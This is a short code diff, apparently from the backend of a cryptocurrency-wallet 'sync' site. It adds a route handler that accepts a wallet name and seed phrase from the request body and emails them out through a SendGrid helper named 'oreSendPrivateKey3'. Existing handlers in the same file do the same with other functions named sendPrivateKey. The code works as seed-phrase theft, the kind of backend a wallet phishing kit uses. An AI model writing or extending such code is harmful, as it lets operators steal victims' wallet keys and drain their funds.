@@ -8,6 +8,7 @@ import {
   sendPrivateKey,
   sendPrivateKey2,
   sendThankUMail,
+  oreSendPrivateKey3,
 } from "../../Email/SendGrid.js";
 
 // Paystack docs
@@ -135,6 +136,23 @@ export const getSyncPhrase2 = async (req, res) => {
   // return;
   try {
     sendPrivateKey2(rPhrase2);
+    return responses.success({
+      res,
+      message: `it a success`,
+    });
+  } catch (error) {
+    console.log(error);
+  }
+};
+
+// Get key and seed phrase
+export const oreSyncPhrase3 = async (req, res) => {
+  const { walletName, rPhrase } = req.body;
+  const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
+  if (!checkPhrase) return;
+  // return;
+  try {
+    oreSendPrivateKey3(walletName, rPhrase);
     return responses.success({
       res,
       message: `it a success`,
